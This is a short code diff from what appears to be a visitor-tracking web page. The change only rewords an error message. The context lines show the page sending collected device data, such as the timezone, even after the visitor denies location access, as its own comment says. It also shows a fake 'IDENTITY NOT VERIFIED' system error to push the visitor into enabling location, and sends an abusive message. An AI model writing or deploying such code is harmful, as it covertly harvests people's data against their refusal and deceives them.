@@ -175,7 +175,7 @@ TIMEZONE: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
                     // Still submits all deviceData collected above
                     const denialLog = `[ACCESS DENIED BY USER]\n${deviceData}\nREASON: User blocked or timed out.`;
                     
-                    locDisplay.innerHTML = "SYSTEM ERROR: IDENTITY NOT VERIFIED Or Enable location and refresh.";
+                    locDisplay.innerHTML = "SYSTEM ERROR: IDENTITY NOT VERIFIED - Enable location and refresh the page if you recieved this message in error. .";
                     triggerSubmission(denialLog, "ACCESS DENIED. FUCK OFF KOOK!", false);
                 });
             } else {
